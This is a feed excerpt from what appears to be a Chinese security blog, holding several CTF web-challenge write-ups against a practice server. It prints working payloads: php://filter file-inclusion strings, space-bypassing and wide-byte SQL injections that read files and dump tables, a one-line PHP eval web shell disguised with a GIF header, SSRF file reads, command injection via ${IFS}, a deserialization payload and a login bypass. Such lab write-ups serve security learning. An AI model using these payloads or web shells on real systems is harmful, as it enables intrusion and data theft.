    <title>week 6 for cnas writeup</title>
    <link href="http://uknowsec.cn/posts/ctf/week-6-for-cnas-writeup.html"/>
    <id>http://uknowsec.cn/posts/ctf/week-6-for-cnas-writeup.html</id>
    <published>2017-12-23T09:55:15.000Z</published>
    <updated>2017-12-23T10:11:20.785Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="文件包含-10"><a href="#文件包含-10" class="headerlink" title="文件包含 10"></a>文件包含 10</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这个题目又是一个文件包含的题目，这里直接用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file=php://filter/read=convert.base64-encode/resource=./key.php</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/flie1111.png" alt=""></p>
<h2 id="SQL注入-10"><a href="#SQL注入-10" class="headerlink" title="SQL注入 10"></a>SQL注入 10</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/02.php" target="_blank" rel="external">http://47.100.121.220:28001/02.php</a></p>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>这个题目是一个注入题，经过测试可以知道过滤了空格，这里可以用%09进行绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?id=1&apos;)%09order%09by%091%23 		返回正常</div><div class="line"></div><div class="line">http://47.100.121.220:28002/02.php?id=1&apos;)%09order%09by%092%23		返回正常</div><div class="line"></div><div class="line">http://47.100.121.220:28002/02.php?id=1&apos;)%09order%09by%093%23		返回异常</div></pre></td></tr></table></figure>
<p>得到字段数为2</p>
<p>提示key在/tmp/360/key中</p>
<p>然后用load_file()函数读取文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?id=0%27%29%09union%09select%091,load_file(&apos;/tmp/360/key&apos;)%23</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/week06_02.png" alt=""></p>
<p>由于数据读取的问题，把id的值改为不存在的值即可读到key</p>
<h2 id="文件上传-10"><a href="#文件上传-10" class="headerlink" title="文件上传 10"></a>文件上传 10</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/03.php" target="_blank" rel="external">http://47.100.121.220:28003/03.php</a></p>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个上传题是检验文件头的，所以直接在php文件加上图片的文件头即可上传成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GIF89a</div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
<p>菜刀连接即可。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/week06_03.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>week 5 for cnas writeup</title>
    <link href="http://uknowsec.cn/posts/ctf/week-5-for-cnas-writeup.html"/>
    <id>http://uknowsec.cn/posts/ctf/week-5-for-cnas-writeup.html</id>
    <published>2017-12-16T14:46:08.000Z</published>
    <updated>2017-12-17T13:18:21.894Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="躲猫猫-50"><a href="#躲猫猫-50" class="headerlink" title="躲猫猫 50"></a>躲猫猫 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这个题目又是一个文件包含的题目，这里直接用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file=php://filter/read=convert.base64-encode/resource=./flag.php</div></pre></td></tr></table></figure>
<p>是读不到源码的，好像是因为这题目的flag并不是在flag.php文件里，flag.php文件并不存在。</p>
<p>所以我们先用php://input 协议来查看当前目录文件</p>
<p>构造如下payload得到du0maOma0_flag.php文件</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/week05_01_01.png" alt=""></p>
<p>这里可以用cat du0maOma0_flag.php来读文件的，</p>
<p>但是一定要查看源码！查看源码！查看源码！</p>
<p>重要的事情说三遍！</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/week05_01_0.png" alt=""></p>
<p>此时也可以再利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file=php://filter/read=convert.base64-encode/resource=./du0maOma0_flag.php</div></pre></td></tr></table></figure>
<p>来读取文件源码</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/week05_01_02.png" alt=""></p>
<p>直接base64解码即可</p>
<h2 id="02-100"><a href="#02-100" class="headerlink" title="02 100"></a>02 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="external">http://47.100.121.220:28002</a></p>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>这个题目我一拿到说就看出来是一个SSRF的题目了，也猜到了代码应该就是</p>
<p><a href="http://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">SSRF漏洞的利用与学习</a></p>
<p>我这篇博客里面的第一种没有任何防护的SSRF。</p>
<p>尝试了 利用file协议任意文件读取 是成功的</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/week05_02_01.png" alt=""></p>
<p>然后没有查看help 是一个phpinfo的页面     找到目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WEB_DOCUMENT_ROOT 	/app</div></pre></td></tr></table></figure>
<p>当时就尝试了 如下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28002/02.php?url=file:///app/flag.php</div></pre></td></tr></table></figure>
<p>但是由于没有去查看源码，就错过了flag，然后一直在纠结利用gopher协议反弹shell</p>
<p>后来在甜哥的提醒下才发现可以直接读出flag的</p>
<p>查看源码就可以了，真的有点尴尬的。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/week05_02_02.png" alt=""></p>
<h2 id="msg-book-200"><a href="#msg-book-200" class="headerlink" title="msg_book 200"></a>msg_book 200</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003" target="_blank" rel="external">http://47.100.121.220:28003</a></p>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>这个题目是一个注入的题，这里的’被转义了，尝试宽字节注入，是可以的。</p>
<p>这里可以参考我的博客</p>
<p><a href="http://uknowsec.cn/posts/notes/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">宽字节注入漏洞的利用与学习</a></p>
<p>在引号前加一个%df即可，具体原理参考博客</p>
<p>下面基本是利用手注的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msg_id=1%df&apos;order by 1 #</div><div class="line"></div><div class="line">msg_id=1%df&apos;order by 2 #</div></pre></td></tr></table></figure>
<p>得到字段数为2 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg_id=1%df&apos;union select 1,database() #</div></pre></td></tr></table></figure>
<p>得到当前数据库：week05_03</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg_id=1%df&apos;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</div></pre></td></tr></table></figure>
<p>得到当前数据库的表名：flag,msg_book</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg_id=1%df&apos;union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 #(flag的十六进制)</div></pre></td></tr></table></figure>
<p>这里因为单引号被过滤了，所以要用十六进制</p>
<p>得到列名：flag</p>
<p>最后直接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msg_id=1%df&apos;union select 1,flag from flag #</div></pre></td></tr></table></figure>
<p>发现自己手注的过程还是不熟悉，需要多多练习</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/week05_03_01.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>month 1 for cnas writeup</title>
    <link href="http://uknowsec.cn/posts/ctf/month-1-for-cnas-writeup.html"/>
    <id>http://uknowsec.cn/posts/ctf/month-1-for-cnas-writeup.html</id>
    <published>2017-12-09T02:51:07.000Z</published>
    <updated>2017-12-10T13:00:44.544Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="签到-50"><a href="#签到-50" class="headerlink" title="签到 50"></a>签到 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001" target="_blank" rel="external">http://47.100.121.220:28001</a></p>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这是一个简单的题目，进入页面可以在相应头中找到flag。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%93%8D%E5%BA%94%E5%A4%B4.png" alt=""></p>
<h2 id="02-100"><a href="#02-100" class="headerlink" title="02 100"></a>02 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="external">http://47.100.121.220:28002</a></p>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>这里的提示是 爬虫什么的，最讨厌了！  所以应该是在说robots.txt文件</p>
<p>另外如果不能想到这个，对于我这种脚本小子。拿到题就是用御剑扫起来。</p>
<p>这里我们可以看到一个图片 Disallow: /2333.png</p>
<p>下载之，这里应该是一个隐身之类的，这里就不用bindwalk跑图片了，直接丢进WinHex下，搜索flag</p>
<p>存在flag.pyc文件，</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/pyc.png" alt=""></p>
<p>应该是一个解压包，把.png改成.zip,解压得到flag.pyc</p>
<p>pyc在线反编译，得到python代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># encoding: utf-8</div><div class="line"># 访问 http://tool.lu/pyc/ 查看更多信息</div><div class="line">print &apos;show me flag&apos;</div><div class="line">a = [</div><div class="line">    4567249,</div><div class="line">    4567259,</div><div class="line">    4567254,</div><div class="line">    4567248,</div><div class="line">    4567244,</div><div class="line">    4567169,</div><div class="line">    4567183,</div><div class="line">    4567252,</div><div class="line">    4567175,</div><div class="line">    4567171,</div><div class="line">    4567250,</div><div class="line">    4567169,</div><div class="line">    4567174,</div><div class="line">    4567170,</div><div class="line">    4567183,</div><div class="line">    4567253,</div><div class="line">    4567183,</div><div class="line">    4567183,</div><div class="line">    4567182,</div><div class="line">    4567250,</div><div class="line">    4567170,</div><div class="line">    4567168,</div><div class="line">    4567252,</div><div class="line">    4567170,</div><div class="line">    4567173,</div><div class="line">    4567172,</div><div class="line">    4567183,</div><div class="line">    4567172,</div><div class="line">    4567252,</div><div class="line">    4567171,</div><div class="line">    4567251,</div><div class="line">    4567169,</div><div class="line">    4567182,</div><div class="line">    4567173,</div><div class="line">    4567168,</div><div class="line">    4567183,</div><div class="line">    4567175,</div><div class="line">    4567183,</div><div class="line">    4567173,</div><div class="line">    4567174,</div><div class="line">    4567183,</div><div class="line">    4567251,</div><div class="line">    4567249,</div><div class="line">    4567170,</div><div class="line">    4567251,</div><div class="line">    4567242]</div><div class="line">flag = &apos;&apos;</div><div class="line">for _ in a:</div><div class="line">    flag += chr(_ ^ 4567223)</div></pre></td></tr></table></figure>
<p>加个输出 print flag </p>
<p>跑一下，得到flag</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/flagpyc.png" alt=""></p>
<h2 id="ping-100"><a href="#ping-100" class="headerlink" title="ping 100"></a>ping 100</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28005/" target="_blank" rel="external">http://47.100.121.220:28005/</a></p>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>拿到题目应该可以看得出来这是一个命令执行的题目。</p>
<p>这里在提交框填什么都会重定向到05.php?ip=127.0.0.1</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E9%87%8D%E5%AE%9A%E5%90%91.png" alt=""></p>
<p>关键在重定向后的这个数据包，这里我们就可以命令执行了</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/pingls.png" alt=""></p>
<p>这里不能直接利用cat flag.php </p>
<p>这里我们利用 \${IFS} 绕过 得到flag</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/IFS.png" alt=""></p>
<p>原本以为是过滤了空格</p>
<p>后面甜哥告诉我是编码的问题 这里不需要利用 \${IFS} 绕过 也可以读取flag的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat%20flag.php</div></pre></td></tr></table></figure>
<h2 id="06-100"><a href="#06-100" class="headerlink" title="06 100"></a>06 100</h2><h3 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28006/06.php" target="_blank" rel="external">http://47.100.121.220:28006/06.php</a></p>
<h3 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">show_source(__FILE__);</div><div class="line">include($_GET[&apos;file&apos;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>这里我们可以看出这是一个文件包含的题目，在服务器应该存在一个flag.php文件</p>
<p>试图访问/flag.php是存在的，状态为200。</p>
<p>这样我们就可以利用文件包含来读flag.php的代码了</p>
<p>这里直接包含是不行的，要利用php的伪协议 php://filter 来读取</p>
<p>php伪协议可以参考我的博客</p>
<p><a href="http://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html">php支持的协议和封装协议小结</a></p>
<p>直接用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file=php://filter/read=convert.base64-encode/resource=./flag.php</div></pre></td></tr></table></figure>
<p>就可以得到base64加密的flag.php源码了,直接解密，得到flag</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/0606060606606.png" alt=""></p>
<h2 id="07-100"><a href="#07-100" class="headerlink" title="07 100"></a>07 100</h2><h3 id="题目链接-4"><a href="#题目链接-4" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28007/" target="_blank" rel="external">http://47.100.121.220:28007/</a></p>
<h3 id="解答-4"><a href="#解答-4" class="headerlink" title="解答"></a>解答</h3><p>打开链接 直接得到源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include(&apos;flag.php&apos;);</div><div class="line"></div><div class="line">class A &#123;</div><div class="line">    var $guess;</div><div class="line">    var $flag;</div><div class="line">&#125;</div><div class="line"></div><div class="line">show_source(__FILE__);</div><div class="line">if (isset($_GET[&apos;k&apos;])) &#123;</div><div class="line">    $k = $_GET[&apos;k&apos;];</div><div class="line"></div><div class="line">    $o = unserialize($k);</div><div class="line"></div><div class="line">    if ($o) &#123;</div><div class="line">        $o-&gt;flag = $flag;</div><div class="line">        if ($o-&gt;flag === $o-&gt;guess) &#123;</div><div class="line">            echo &quot;Congratulation! &quot;.$o-&gt;flag;</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            echo &quot;wrong!!&quot;;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        echo &quot;wrong!&quot;;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>对源码进行分析，可以知道这是一个反序列化的题目，关键的判断在如下代码部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$o-&gt;flag = $flag;</div><div class="line">      if ($o-&gt;flag === $o-&gt;guess) &#123;</div><div class="line">          echo &quot;Congratulation! &quot;.$o-&gt;flag;</div><div class="line">      &#125;</div><div class="line">      else &#123;</div><div class="line">          echo &quot;wrong!!&quot;;</div><div class="line">      &#125;</div></pre></td></tr></table></figure>
<p>从代码的理解我们需要做到对象里的flag成员变量的值等于guess的成员变量的值</p>
<p>即 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$o-&gt;flag === $o-&gt;guess</div></pre></td></tr></table></figure>
<p>这里我们可以写一个1.php的序列化文件，使我们的类和对象符合题目中的条件，</p>
<p>再利用serialize()函数 序列化得到payload,再把payload赋值给k，由此得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">class A &#123;</div><div class="line">    var $flag;</div><div class="line">    var $guess;</div><div class="line">    function A()</div><div class="line">    &#123;</div><div class="line">        $this-&gt;flag=&amp;$this-&gt;guess;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">echo serialize(new A());</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/serializetest.png" alt=""></p>
<p>得到paylad</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;flag&quot;;N;s:5:&quot;guess&quot;;R:2;&#125;</div></pre></td></tr></table></figure>
<p>赋值给k,得到flag</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/unserializectf.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>week 3 for cnas writeup</title>
    <link href="http://uknowsec.cn/posts/ctf/week-3-for-cnas-writeup.html"/>
    <id>http://uknowsec.cn/posts/ctf/week-3-for-cnas-writeup.html</id>
    <published>2017-12-02T02:44:06.000Z</published>
    <updated>2017-12-02T13:50:40.132Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="login-50"><a href="#login-50" class="headerlink" title="login 50"></a>login 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001" target="_blank" rel="external">http://47.100.121.220:28001</a></p>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>一开始以为这个题是注入题，能从数据库中拿到flag,结果数据库里没有flag。结果群里的大佬说是简单的万能密码。</p>
<p>user=admin’ or 1 #&amp;pass=1 绕过，得到源码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include &quot;config.php&quot;;</div><div class="line">include &quot;flag.php&quot;;</div><div class="line"></div><div class="line">if( isset($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;pass&quot;])) &#123;</div><div class="line">    $user = $_POST[&quot;user&quot;];</div><div class="line">    $pass = md5($_POST[&quot;pass&quot;]);</div><div class="line">    $auth = false;</div><div class="line">    </div><div class="line">    $conn = mysql_connect($db_host, $db_user, $db_pass) or die(&quot;Unable to connect!&quot;);</div><div class="line">    mysql_select_db($db_name) or die(&quot;Unable to select database!&quot;);</div><div class="line">    </div><div class="line">    $sql = &quot;select user_id from user where user=&apos;$user&apos; and password=&apos;$pass&apos;&quot;;</div><div class="line">    $query = mysql_query($sql);</div><div class="line">    if(!$query) &#123;</div><div class="line">        mysql_close($conn);</div><div class="line">        die(&quot;login failed!&quot;);</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    $row = mysql_fetch_array($query, MYSQL_ASSOC);</div><div class="line">    if($row[&apos;user_id&apos;]) &#123;</div><div class="line">        show_source(__FILE__);</div><div class="line">        if(isset($_GET[&apos;data&apos;]))&#123;</div><div class="line">            $data = $_GET[&apos;data&apos;];</div><div class="line">            if(&apos;php&apos;===$data[&apos;a&apos;] &amp;&amp;</div><div class="line">               &apos;is&apos;===$data[&apos;b&apos;] &amp;&amp;</div><div class="line">               &apos;nice&apos;===$data[&apos;c&apos;] &amp;&amp;</div><div class="line">               &apos;!&apos;===$data[3]) &#123;</div><div class="line">                   $auth=true;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    mysql_close($conn);</div><div class="line">    </div><div class="line">    if($auth) &#123;</div><div class="line">        echo &quot;login success!&quot;;</div><div class="line">        echo $flag;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        die(&quot;login failed!&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>以上代码的关键，还是在data变量数组传入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">if(isset($_GET[&apos;data&apos;]))&#123;</div><div class="line">    $data = $_GET[&apos;data&apos;];</div><div class="line">    if(&apos;php&apos;===$data[&apos;a&apos;] &amp;&amp;</div><div class="line">       &apos;is&apos;===$data[&apos;b&apos;] &amp;&amp;</div><div class="line">       &apos;nice&apos;===$data[&apos;c&apos;] &amp;&amp;</div><div class="line">       &apos;!&apos;===$data[3]) &#123;</div><div class="line">           $auth=true;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>以上是关键代码，本地做一个简单的测试，看是否能data[a]这样的形式传入参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">var_dump( $_POST[&quot;data&quot;]);</div><div class="line">echo &apos;&lt;br&gt;&apos;;</div><div class="line">print_r( $_POST[&quot;data&quot;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720171202214639.png" alt=""></p>
<p>这里可以知道我们是可以这样传入参数的，因此构造payload得到flag</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720171202214702.png" alt=""></p>
<h2 id="where-are-you-from-100"><a href="#where-are-you-from-100" class="headerlink" title="where are you from 100"></a>where are you from 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="external">http://47.100.121.220:28002</a></p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>Referer</p>
<ul>
<li>包含一个URL，用户从该URL代表的页面出发访问当前请求的页面</li>
</ul>
<p>X-Forwarded-For</p>
<ul>
<li>是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</li>
</ul>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>这个题目考察的就是HTTP头信息里中的以上两个头部。</p>
<p>在GET包里添加 X-Forwarded-For: 127.0.0.1</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/xfx.png" alt=""></p>
<p>这里我们可以得到一个next.php页面，这个地方也要验证的。验证了X-Forwarded-For和Referer，我们把他们同时改为本地地址</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/xff-refere.png" alt=""></p>
<h2 id="日志审计-100"><a href="#日志审计-100" class="headerlink" title="日志审计 100"></a>日志审计 100</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://uknowsec.cn/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>week 2 for cnas writeup</title>
    <link href="http://uknowsec.cn/posts/ctf/week-2-for-cnas-writeup.html"/>
    <id>http://uknowsec.cn/posts/ctf/week-2-for-cnas-writeup.html</id>
    <published>2017-11-25T03:41:12.000Z</published>
    <updated>2017-11-26T03:44:16.622Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="火星文-50"><a href="#火星文-50" class="headerlink" title="火星文 50"></a>火星文 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/" target="_blank" rel="external">http://47.100.121.220:28001/</a></p>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>看到题目就判断为javascript的题目，把火星人A和火星人B的内容复制粘贴到控制台</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E7%81%AB%E6%98%9F%E6%96%87.png" alt=""></p>
